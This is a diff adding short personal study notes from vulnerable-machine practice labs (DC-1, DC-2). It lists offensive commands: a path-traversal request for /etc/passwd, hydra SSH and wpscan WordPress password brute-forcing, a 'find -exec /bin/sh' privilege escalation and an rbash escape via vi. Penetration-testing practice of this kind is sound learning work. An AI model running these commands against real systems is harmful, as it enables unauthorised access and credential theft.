@@ -37,3 +37,23 @@ ls /etc | grep release : know the distribution of the OS
 https://10.0.4.13/?page=/../../../etc/passwd%00
 hydra -L users -P /usr/share/wordlists/rockyou.txt 10.0.4.13 ssh -V
 ```
+#### DC-1
+what I had learn from this machine is:
+```
+find / -exec /bin/sh \;
+```
+#### DC-2
+what I had learn from this machine is:
+```
+./wpscan --url http://dc-2/
+./wpscan --url http://dc-2/ --enumerate : enumerate users
+./wpscan --url http://dc-2/ --usernames file -w wordlist : brute force wp-login.php authenticity
+ssh -p- dc-2 : check all ports
+ssh -p 7744 tom@dc-2
+how to bypass rbash shell : vi,echo os.system('/bin/bash') => https://sushant747.gitbooks.io/total-oscp-guide/escaping_restricted_shell.html
+```
+this one is soo interesting: https://sushant747.gitbooks.io/total-oscp-guide/vim.html
+
+
+
+
